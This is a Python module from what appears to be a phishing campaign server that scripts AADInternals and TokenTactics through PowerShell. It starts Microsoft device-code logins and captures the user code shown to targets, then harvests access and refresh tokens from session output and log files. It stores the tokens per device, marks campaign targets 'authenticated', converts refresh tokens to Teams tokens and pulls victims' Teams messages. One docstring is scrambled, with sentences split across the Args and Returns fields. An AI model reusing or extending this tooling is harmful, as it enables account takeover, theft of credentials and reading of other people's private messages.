"""
PowerShell integration utilities for the Kodes server.
"""
import subprocess
import re
import threading
import logging
import os
import platform
import time
import glob
import base64
from .. import models
from .config import get_target_domain, get_target_domain_for

logger = logging.getLogger(__name__)

active_sessions = {}
sessions_lock = threading.Lock()

_MODULES_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', '..'))
AAD_INTERNALS_PATH = os.environ.get('AAD_INTERNALS_PATH', os.path.join(_MODULES_ROOT, 'aadinternals', 'AADInternals.psd1'))
TOKEN_TACTICS_PATH = os.environ.get('TOKEN_TACTICS_PATH', os.path.join(_MODULES_ROOT, 'tokentactics', 'TokenTactics.psd1'))
TOKEN_LOG_PATH = os.environ.get('TOKEN_LOG_PATH', os.path.join(_MODULES_ROOT, 'TokenLog.log'))

def get_powershell_command():
    """Get the appropriate PowerShell executable name based on platform"""
    import shutil
    if platform.system() == 'Windows':
        return "powershell"
    pwsh = shutil.which("pwsh")
    if pwsh:
        return pwsh
    ps = shutil.which("powershell")
    if ps:
        return ps
    raise FileNotFoundError("PowerShell not found in PATH. Install pwsh or powershell.")


def get_teams_messages(teams_token, format_output=False):
    """
    Retrieve Teams messages using the AADInternals PowerShell module.

    Args:
        teams_token: The Teams access token
        format_output: Whether to format the output using Format-Table

    Returns:
        str: The messages output from PowerShell
    """
    if not teams_token:
        return "No Teams token provided"

    try:
        powershell_cmd = get_powershell_command()
        try:
            check_process = subprocess.run([powershell_cmd, "-Command", "echo 'PowerShell is available'"],
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          text=True,
                                          timeout=5)
            if check_process.returncode != 0:
                return f"Error: PowerShell ({powershell_cmd}) is not available on this system. Error: {check_process.stderr}"
        except Exception as e:
            return f"Error: PowerShell ({powershell_cmd}) is not available on this system. Error: {str(e)}"
            
        token_b64 = base64.b64encode(teams_token.encode()).decode()
        decode_and_execute = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{token_b64}'))"

        base_command = f"Import-Module \"{AAD_INTERNALS_PATH}\"; Get-AADIntTeamsMessages -AccessToken ({decode_and_execute})"
        
        if format_output:
            command = f"{base_command} | Format-Table -Property DisplayName,ArrivalTime,Content -AutoSize"
        else:
            command = base_command
        
        process = subprocess.Popen(
            [powershell_cmd, "-Command", command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding='utf-8',
            errors='replace'
        )
        
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            logger.error(f"PowerShell error: {stderr}")
            return f"Error retrieving Teams messages: {stderr}"
        
        return stdout
    except Exception as e:
        logger.error(f"Error executing PowerShell: {e}")
        return f"Error: {str(e)}"


def get_teams_messages_async(teams_token, hostname):
    """
    Process Teams messages asynchronously and save to database.
    This function is intended to be run in a separate thread.
    
    Args:
        teams_token: The Teams access token
        hostname: The device hostname
        
    Returns:
        None
    """
    from .. import models
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    import os
    
    try:
        from ...utils.config import get_db_path
        db_path = get_db_path()
        db_url = f"sqlite:///{db_path}"
        engine = create_engine(db_url)
        Session = sessionmaker(bind=engine)
        session = Session()
        
        teams_messages = session.query(models.TeamsMessages).filter_by(hostname=hostname).first()
        if not teams_messages:
            teams_messages = models.TeamsMessages(hostname=hostname)
            session.add(teams_messages)
            session.commit()
        
        teams_messages.status = 'processing'
        session.commit()
        
        try:
            raw_messages = get_teams_messages(teams_token)
            
            formatted_messages = get_teams_messages(teams_token, format_output=True)
            
            teams_messages.messages_raw = raw_messages
            teams_messages.messages_formatted = formatted_messages
            teams_messages.status = 'completed'
            teams_messages.last_updated = models.datetime.now()
            teams_messages.error_message = None
            session.commit()
            
            logger.info(f"Teams messages successfully retrieved and cached for {hostname}")
        except Exception as e:
            logger.error(f"Error retrieving Teams messages: {e}")
            teams_messages.status = 'failed'
            teams_messages.error_message = str(e)
            session.commit()
    
    except Exception as e:
        logger.error(f"Error in teams messages async process: {e}")
    finally:
        session.close()


def check_active_session(hostname):
    """
    Checks whether an active PowerShell session exists for a device.
    
    Args:
        hostname: Cihaz hostname
        
    Returns:
        bool: True if an active session exists, False otherwise
    """
    with sessions_lock:
        session_data = active_sessions.get(hostname)
        if session_data:
            if isinstance(session_data, dict):
                process = session_data.get('process')
                start_time = session_data.get('start_time', 0)
                
                if process and process.poll() is None:
                    if time.time() - start_time > 600:
                        logger.info(f"Session for {hostname} timed out, terminating")
                        try:
                            process.terminate()
                            process.wait(timeout=5)
                        except:
                            pass
                        active_sessions.pop(hostname, None)
                        return False
                    return True
                else:
                    active_sessions.pop(hostname, None)
                    return False
            elif hasattr(session_data, 'is_active'):
                if session_data.is_active():
                    if time.time() - getattr(session_data, 'start_time', 0) > 600:
                        logger.info(f"Session for {hostname} timed out, terminating")
                        try:
                            session_data.terminate()
                        except:
                            pass
                        active_sessions.pop(hostname, None)
                        return False
                    return True
                else:
                    active_sessions.pop(hostname, None)
                    return False
        return False


def check_token_log():
    """
    Extracts token information by checking the TokenLog.log file.
    
    Returns:
        dict: {hostname: {'access_token': token, 'refresh_token': token}}
    """
    tokens = {}
    
    try:
        log_files = []
        if os.path.exists(TOKEN_LOG_PATH):
            log_files.append(TOKEN_LOG_PATH)
        
        token_logs = glob.glob(os.path.join(os.path.dirname(TOKEN_LOG_PATH), "TokenLog*.log"))
        for log_file in token_logs:
            if log_file not in log_files:
                log_files.append(log_file)
                
        for log_file in log_files:
            logger.info(f"Checking token log file: {log_file}")
            
            try:
                with open(log_file, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                    
                    hostname_matches = []
                    for match in re.finditer(r"Hostname:\s*([^\s\n]+)", content):
                        hostname = match.group(1).strip()
                        position = match.start()
                        if hostname:
                            hostname_matches.append((hostname, position))
                    
                    token_positions = []
                    for match in re.finditer(r"-{5,}\s*Tokens\s*-{5,}", content):
                        token_positions.append(match.start())
                    
                    if hostname_matches and token_positions:
                        logger.info(f"Found {len(hostname_matches)} hostname entries and {len(token_positions)} token section markers")
                        
                        for token_pos in token_positions:
                            matching_hostname = None
                            max_pos = -1
                            
                            for hostname, pos in hostname_matches:
                                if pos < token_pos and pos > max_pos:
                                    matching_hostname = hostname
                                    max_pos = pos
                            
                            if matching_hostname:
                                token_end = content.find("----- Tokens -----", token_pos + 20)
                                if token_end == -1:
                                    token_end = len(content)
                                    
                                token_part = content[token_pos:token_end].strip()
                                
                                access_token_match = re.search(r"(eyJ[a-zA-Z0-9_\-\.]+)", token_part)
                                refresh_token_match = re.search(r"(1\.[A-Za-z0-9_\-\.]{100,})", token_part)
                            
                                if access_token_match and refresh_token_match:
                                    access_token = access_token_match.group(1).strip()
                                    refresh_token = refresh_token_match.group(1).strip()
                                    
                                    if len(access_token) > 100 and len(refresh_token) > 20:
                                        if matching_hostname not in tokens:
                                            tokens[matching_hostname] = {}
                                            
                                        tokens[matching_hostname]['access_token'] = access_token
                                        tokens[matching_hostname]['refresh_token'] = refresh_token
                                        
                                        logger.info(f"Found tokens for {matching_hostname} in log file")
                                    else:
                                        logger.warning(f"Suspicious token lengths for {matching_hostname}: access_token={len(access_token)}, refresh_token={len(refresh_token)}")
                                else:
                                    lines = token_part.split('\n')
                                    token_lines = [line.strip() for line in lines if line.strip()]
                                    
                                    if len(token_lines) >= 2:
                                        potential_access = token_lines[0]
                                        potential_refresh = token_lines[1]
                                        
                                        if potential_access.startswith("eyJ") and potential_refresh.startswith("1.") and len(potential_refresh) > 100:
                                            if len(potential_access) > 100 and len(potential_refresh) > 20:
                                                if matching_hostname not in tokens:
                                                    tokens[matching_hostname] = {}
                                                    
                                                tokens[matching_hostname]['access_token'] = potential_access
                                                tokens[matching_hostname]['refresh_token'] = potential_refresh
                                                
                                                logger.info(f"Found tokens using line pattern for {matching_hostname}")
                                            else:
                                                logger.warning(f"Suspicious token lengths in line pattern for {matching_hostname}")
                                        else:
                                            logger.debug(f"Lines don't match token patterns for {matching_hostname}")
                                    else:
                                        logger.debug(f"Not enough token lines found for {matching_hostname}")
                            else:
                                logger.debug(f"No matching hostname found for token at position {token_pos}")
                    else:
                        logger.debug("No valid hostname entries or token sections found")
            except Exception as e:
                logger.error(f"Error reading log file {log_file}: {e}")
                
    except Exception as e:
        logger.error(f"Error checking token logs: {e}")
        
    return tokens


def attribute_unclaimed_tokens(hostname):
    """
    TokenTactics does not write a "Hostname:" line to TokenLog.log; sections stay
    unclaimed and check_token_log() cannot match them. Prefixes every unclaimed
    "----- Tokens -----" section with the requested hostname, binding it to that
    device. The assignment is written to the file — persistent, so the section

    Args:
        is not counted as unclaimed a second time.

    Returns:
        hostname: Device to assign the sections to
    """
    try:
        if not os.path.exists(TOKEN_LOG_PATH):
            return False

        with open(TOKEN_LOG_PATH, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        section_re = re.compile(r"-{5,}\s*Tokens\s*-{5,}")
        hostname_re = re.compile(r"Hostname:\s*[^\s\n]+")

        pieces = []
        last_end = 0
        attributed = False
        for m in section_re.finditer(content):
            if hostname_re.search(content[:m.start()]):
                continue
            pieces.append(content[last_end:m.start()])
            pieces.append(f"Hostname: {hostname}\n")
            last_end = m.start()
            attributed = True

        if not attributed:
            return False

        pieces.append(content[last_end:])
        with open(TOKEN_LOG_PATH, 'w', encoding='utf-8') as f:
            f.write(''.join(pieces))
        logger.info(f"Attributed unclaimed token section(s) to {hostname}")
        return True

    except Exception as e:
        logger.error(f"Error attributing token sections to {hostname}: {e}")
        return False


def process_tokens_for_device(hostname, db_session):
    """
    Checks token logs for a specific device and updates the database.
    
    Args:
        hostname: Cihaz hostname
        db_session: Database session
        
    Returns:
        bool: True if tokens were found and processed, False otherwise
    """
    try:
        logger.info(f"Checking for tokens in log file for {hostname}")
        tokens = check_token_log()
        
        matching_hostname = hostname
        if hostname not in tokens:
            for host_key in tokens.keys():
                if hostname.lower() in host_key.lower() or host_key.lower() in hostname.lower():
                    matching_hostname = host_key
                    logger.info(f"Found partial hostname match: {hostname} -> {matching_hostname}")
                    break

        if matching_hostname not in tokens or 'access_token' not in tokens.get(matching_hostname, {}):
            if attribute_unclaimed_tokens(hostname):
                tokens = check_token_log()
                matching_hostname = hostname

        if matching_hostname in tokens and 'access_token' in tokens[matching_hostname] and 'refresh_token' in tokens[matching_hostname]:
            access_token = tokens[matching_hostname]['access_token']
            refresh_token = tokens[matching_hostname]['refresh_token']
            
            logger.info(f"Processing tokens found for {matching_hostname}")
            
            from ..utils.security import parse_jwt_token, encrypt_token
            
            try:
                token_payload = parse_jwt_token(access_token)
                
                ipaddr = token_payload.get('ipaddr')
                name = token_payload.get('name')
                upn = token_payload.get('upn')
                
                logger.info(f"Parsed JWT token for {matching_hostname}: name={name}, upn={upn}")
                
                encrypted_access_token = encrypt_token(access_token)
                encrypted_refresh_token = encrypt_token(refresh_token)
                
                device_info = db_session.query(models.DeviceInfo).filter_by(hostname=hostname).first()
                if device_info:
                    device_info.access_token = encrypted_access_token
                    device_info.refresh_token = encrypted_refresh_token
                    device_info.ipaddr = ipaddr
                    device_info.name = name
                    device_info.upn = upn

                    # Permission analysis fields (parity with the live-session
                    # path): scope/role lists, admin flag and token expiry
                    import json
                    if token_payload.get('scopes'):
                        device_info.scopes = json.dumps(token_payload['scopes'])
                    if token_payload.get('roles'):
                        device_info.roles = json.dumps(token_payload['roles'])
                    device_info.has_admin_permissions = bool(
                        token_payload.get('has_admin_scopes')
                        or token_payload.get('has_admin_role'))
                    if token_payload.get('exp'):
                        try:
                            from datetime import datetime
                            device_info.token_expiry = datetime.fromtimestamp(
                                token_payload['exp'])
                        except Exception as exp_err:
                            logger.warning(f"Could not convert token expiry: {exp_err}")

                    db_session.commit()

                    log_message = f"{hostname} tokens processed from log file"
                    log_entry = models.Log(hostname=hostname, log_message=log_message)
                    db_session.add(log_entry)
                    db_session.commit()

                    if device_info.campaign_id:
                        try:
                            target = db_session.query(models.Target).filter_by(
                                campaign_id=device_info.campaign_id, hostname=hostname).first()
                            if target and target.status != 'authenticated':
                                target.status = 'authenticated'
                                db_session.commit()
                        except Exception as e:
                            logger.debug(f"Target status bump failed for {hostname}: {e}")

                    with sessions_lock:
                        if hostname in active_sessions:
                            if isinstance(active_sessions[hostname], dict):
                                process = active_sessions[hostname].get('process')
                                if process:
                                    try:
                                        logger.info(f"Terminating PowerShell process for {hostname} after token acquisition")
                                        process.terminate()
                                        process.wait(timeout=5)
                                        active_sessions[hostname]['process'] = None
                                        active_sessions[hostname]['tokens_processed'] = True
                                    except Exception as term_err:
                                        logger.error(f"Error terminating process: {term_err}")
                            elif hasattr(active_sessions[hostname], 'process'):
                                try:
                                    active_sessions[hostname].terminate()
                                except Exception as term_err:
                                    logger.error(f"Error terminating process: {term_err}")
                                active_sessions[hostname] = {
                                    'tokens_processed': True,
                                    'user_code': getattr(active_sessions[hostname], 'user_code', None)
                                }
                            
                    return True
                else:
                    logger.error(f"Device {hostname} not found in database")
                    
            except Exception as e:
                logger.error(f"Error processing token for {hostname}: {e}")
                
        else:
            logger.debug(f"No tokens found for {hostname} in log file")
                
    except Exception as e:
        logger.error(f"Error in process_tokens_for_device for {hostname}: {e}")
        
    return False


def run_token_acquisition(hostname, event, shared_data, db_session):
    try:
        if process_tokens_for_device(hostname, db_session):
            logger.info(f"Tokens found in log file for {hostname}")
            shared_data['tokens_found'] = True
            event.set()
            return True

        session = PowerShellSession(hostname)

        hostname_b64 = base64.b64encode(hostname.encode()).decode()
        hostname_decoded = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{hostname_b64}'))"

        device_code_command = f"""
Import-Module "{TOKEN_TACTICS_PATH}";
Write-Host ("Getting MSGraph token for " + ({hostname_decoded}));
# fall back to the original command
Get-AzureToken -Client MSGraph;
"""
        
        if not session.start_session(device_code_command):
            logger.error(f"Failed to start PowerShell session for {hostname}")
            return False
            
        with sessions_lock:
            active_sessions[hostname] = {
                'process': session.process,
                'start_time': session.start_time,
                'session_obj': session,
                'hostname': hostname
            }
            
        def read_session_output():
            while session.is_active():
                if session.read_output():
                    if session.user_code:
                        shared_data['user_code'] = session.user_code
                        with sessions_lock:
                            if hostname in active_sessions:
                                active_sessions[hostname]['user_code'] = session.user_code
                                logger.info(f"Added user_code to active_sessions for {hostname}")
                        event.set()
                        logger.info(f"Event set with user_code for {hostname}")
                        
                        
                    if session.token_found:
                        with sessions_lock:
                            if hostname in active_sessions:
                                active_sessions[hostname]['token_found'] = True
                                if session.access_token and session.refresh_token:
                                    active_sessions[hostname]['access_token'] = session.access_token
                                    active_sessions[hostname]['refresh_token'] = session.refresh_token
                                    logger.info(f"Stored tokens in active_sessions for {hostname}")
                        
                        if session.access_token and session.refresh_token:
                            from ..utils.security import parse_jwt_token, encrypt_token
                            
                            try:
                                token_payload = parse_jwt_token(session.access_token)
                                
                                ipaddr = token_payload.get('ipaddr')
                                name = token_payload.get('name')
                                upn = token_payload.get('upn')
                                
                                logger.info(f"Parsed JWT token for {hostname}: name={name}, upn={upn}")
                                
                                encrypted_access_token = encrypt_token(session.access_token)
                                encrypted_refresh_token = encrypt_token(session.refresh_token)
                                
                                device_info = db_session.query(models.DeviceInfo).filter_by(hostname=hostname).first()
                                if device_info:
                                    device_info.access_token = encrypted_access_token
                                    device_info.refresh_token = encrypted_refresh_token
                                    device_info.ipaddr = ipaddr
                                    device_info.name = name
                                    device_info.upn = upn
                                    
                                    import json
                                    if 'scopes' in token_payload:
                                        device_info.scopes = json.dumps(token_payload['scopes'])
                                    if 'roles' in token_payload:
                                        device_info.roles = json.dumps(token_payload.get('roles', []))
                                    device_info.has_admin_permissions = bool(
                                        token_payload.get('has_admin_scopes')
                                        or token_payload.get('has_admin_role'))
                                    if 'exp' in token_payload:
                                        try:
                                            from datetime import datetime
                                            device_info.token_expiry = datetime.fromtimestamp(token_payload['exp'])
                                        except Exception as e:
                                            logger.warning(f"Could not convert token expiry: {e}")
                                            
                                    db_session.commit()
                                    
                                    log_message = f"{hostname} tokens processed directly from session"
                                    log_entry = models.Log(hostname=hostname, log_message=log_message)
                                    db_session.add(log_entry)
                                    db_session.commit()

                                    if device_info.campaign_id:
                                        try:
                                            target = db_session.query(models.Target).filter_by(
                                                campaign_id=device_info.campaign_id,
                                                hostname=hostname).first()
                                            if target and target.status != 'authenticated':
                                                target.status = 'authenticated'
                                                db_session.commit()
                                        except Exception as e:
                                            logger.debug(f"Target status bump failed for {hostname}: {e}")
                                    
                                    shared_data['tokens_found'] = True
                                    logger.info(f"Tokens successfully processed for {hostname}")
                                    
                                    target_domain = get_target_domain_for(hostname, db_session)
                                    from .validators import valid_domain
                                    if not target_domain or not valid_domain(target_domain):
                                        logger.error(
                                            "Target domain not configured or invalid; skipping "
                                            "Teams token request for %s", hostname)
                                    else:
                                        token_b64 = base64.b64encode(
                                            session.refresh_token.encode('utf-8')).decode('ascii')
                                        safe_hostname = re.sub(r'[^\w.-]', '_', hostname or 'unknown')
                                        teams_token_command = f"""
Import-Module "{TOKEN_TACTICS_PATH}";
# Refresh token travels base64-encoded; decoded here
$refreshToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{token_b64}"));
Write-Host "Converting to Teams token for {safe_hostname}";
Invoke-RefreshToMSTeamsToken -domain {target_domain} -refreshToken $refreshToken;
"""
                                        teams_session = PowerShellSession(hostname)
                                        teams_session.start_session(teams_token_command)
                                    
                                    event.set()
                            except Exception as e:
                                logger.error(f"Error processing direct tokens for {hostname}: {e}")
                                
                                logger.info(f"Falling back to log file method for {hostname}")
                                token_processed = process_tokens_for_device(hostname, db_session)
                                if token_processed:
                                    shared_data['tokens_found'] = True
                                    logger.info(f"Tokens successfully processed for {hostname} via log")
                                    event.set()
                        else:
                            logger.info(f"Tokens not found in session, checking log file for {hostname}")
                            token_processed = process_tokens_for_device(hostname, db_session)
                            if token_processed:
                                shared_data['tokens_found'] = True
                                logger.info(f"Tokens successfully processed for {hostname} via log")
                                event.set()
                        
                            
                time.sleep(1)
                
        output_thread = threading.Thread(target=read_session_output)
        output_thread.daemon = True
        output_thread.start()
        
        timeout = 600
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if shared_data.get('tokens_found'):
                return True
            time.sleep(1)
            
        session.terminate()
        with sessions_lock:
            if hostname in active_sessions:
                if isinstance(active_sessions[hostname], dict) and (
                    active_sessions[hostname].get('token_found') or 
                    active_sessions[hostname].get('tokens_processed')
                ):
                    logger.info(f"Not removing active session for {hostname} as token was found or processed")
                else:
                    active_sessions.pop(hostname, None)
            
        return False
        
    except Exception as e:
        logger.error(f"Error in token acquisition process: {e}")
        return False

class PowerShellSession:
    def __init__(self, hostname):
        self.hostname = hostname
        self.process = None
        self.start_time = time.time()
        self.user_code = None
        self.token_found = False
        self.access_token = None
        self.refresh_token = None
        self.output_buffer = ""
        self.collecting_access_token = False
        self.collecting_refresh_token = False
        self.lock = threading.Lock()
        
    def start_session(self, command):
        """Starts a new PowerShell session"""
        try:
            powershell_cmd = get_powershell_command()
            token_log_dir = os.path.dirname(TOKEN_LOG_PATH) or None
            self.process = subprocess.Popen(
                [powershell_cmd, "-NoExit", "-Command", command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                cwd=token_log_dir
            )
            return True
        except Exception as e:
            logger.error(f"Error starting PowerShell session for {self.hostname}: {e}")
            return False
            
    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

    def read_output(self):
        """Reads session output and appends to the buffer"""
        if not self.process:
            return False

        try:
            while True:
                output = self.process.stdout.readline()
                if not output:
                    return False
                if output:
                    line = self._ANSI_RE.sub('', output).strip()
                    with self.lock:
                        self.output_buffer += output
                        logger.debug(f"PowerShell output for {self.hostname}: {line}")

                        if not self.user_code:
                            user_code_match = re.search(r"user_code\s*:\s*([A-Z0-9]{6,12})",
                                                        line)
                            if not user_code_match:
                                user_code_match = re.search(r"enter the code\s+([A-Z0-9-]+)",
                                                            line, re.IGNORECASE)
                            if not user_code_match:
                                user_code_match = re.search(r"^([A-Z0-9]{6,12})\s+to authenticate",
                                                            line, re.IGNORECASE)
                            if user_code_match:
                                self.user_code = user_code_match.group(1).strip()
                                logger.info(f"Found user_code for {self.hostname}: {self.user_code}")
                                return True

                            code_only_match = re.search(r"^([A-Z0-9]{6,10})$", line)
                            if code_only_match and not self.user_code:
                                potential_code = code_only_match.group(1).strip()
                                if len(potential_code) >= 6 and len(potential_code) <= 10:
                                    self.user_code = potential_code
                                    logger.info(f"Found potential user_code from direct output for {self.hostname}: {self.user_code}")
                                    return True
                        
                        if line == "ACCESS_TOKEN_START":
                            self.collecting_access_token = True
                            self.access_token = ""
                            continue
                            
                        if self.collecting_access_token:
                            if line == "ACCESS_TOKEN_END":
                                self.collecting_access_token = False
                                logger.info(f"Collected complete access token for {self.hostname}")
                            elif line and not line.startswith("ACCESS_TOKEN_"):
                                self.access_token = line
                                
                        if line == "REFRESH_TOKEN_START":
                            self.collecting_refresh_token = True
                            self.refresh_token = ""
                            continue
                            
                        if self.collecting_refresh_token:
                            if line == "REFRESH_TOKEN_END":
                                self.collecting_refresh_token = False
                                logger.info(f"Collected complete refresh token for {self.hostname}")
                                if self.access_token and self.refresh_token:
                                    self.token_found = True
                                    logger.info(f"Both tokens collected for {self.hostname}")
                            elif line and not line.startswith("REFRESH_TOKEN_"):
                                self.refresh_token = line
                                
                        if not self.token_found or not self.access_token or not self.refresh_token:
                            token_match = re.search(r"(?:eyJ[a-zA-Z0-9_\-\.]+|1\.[A-Za-z0-9_\-\.]{100,})",
                                                  line)
                            if token_match:
                                self.token_found = True
                                logger.info(f"Token found in output for {self.hostname}")
                                
                                try:
                                    import time
                                    import os
                                    logger.info(f"Checking log file after finding token in output for {self.hostname}")
                                    
                                    time.sleep(1)
                                    
                                    token_log_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', 'TokenLog.log'))
                                    if os.path.exists(token_log_path):
                                        with open(token_log_path, 'r', encoding='utf-8', errors='replace') as f:
                                            content = f.read()
                                            access_token_matches = re.findall(r"(eyJ[a-zA-Z0-9_\-\.]+)", content)
                                            refresh_token_matches = re.findall(r"(1\.AQ[a-zA-Z0-9_\-\.]+)", content)
                                            
                                            if access_token_matches and refresh_token_matches:
                                                self.access_token = access_token_matches[-1]
                                                self.refresh_token = refresh_token_matches[-1]
                                                logger.info(f"Successfully extracted tokens from log file for {self.hostname}")
                                                
                                                try:
                                                    from .. import models
                                                    from ..utils.security import parse_jwt_token, encrypt_token
                                                    from sqlalchemy.orm import sessionmaker
                                                    from sqlalchemy import create_engine
                                                    
                                                    db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', 'database', 'kodes.db'))
                                                    db_url = f"sqlite:///{db_path}"
                                                    engine = create_engine(db_url)
                                                    Session = sessionmaker(bind=engine)
                                                    session = Session()
                                                    
                                                    token_payload = parse_jwt_token(self.access_token)
                                                    
                                                    name = token_payload.get('name')
                                                    upn = token_payload.get('upn')
                                                    ipaddr = token_payload.get('ipaddr')
                                                    logger.info(f"Token payload from log file: name={name}, upn={upn}")
                                                    
                                                    device = session.query(models.DeviceInfo).filter_by(hostname=self.hostname).first()
                                                    if device:
                                                        device.access_token = encrypt_token(self.access_token)
                                                        device.refresh_token = encrypt_token(self.refresh_token)
                                                        device.name = name
                                                        device.upn = upn
                                                        device.ipaddr = ipaddr
                                                        logger.info(f"Updated device {self.hostname} in database with token info")
                                                        session.commit()
                                                    session.close()
                                                except Exception as db_err:
                                                    logger.error(f"Error updating database with token info: {db_err}")
                                except Exception as e:
                                    logger.error(f"Error checking log file after token found: {e}")
                                
                elif self.process.poll() is not None:
                    break
                    
            return True
        except Exception as e:
            logger.error(f"Error reading PowerShell output for {self.hostname}: {e}")
            return False
            
    def is_active(self):
        """Checks whether the session is active"""
        if not self.process:
            return False
        return self.process.poll() is None
        
    def terminate(self):
        """Terminates the session"""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except Exception as e:
                logger.error(f"Error terminating PowerShell session for {self.hostname}: {e}")
            finally:
                self.process = None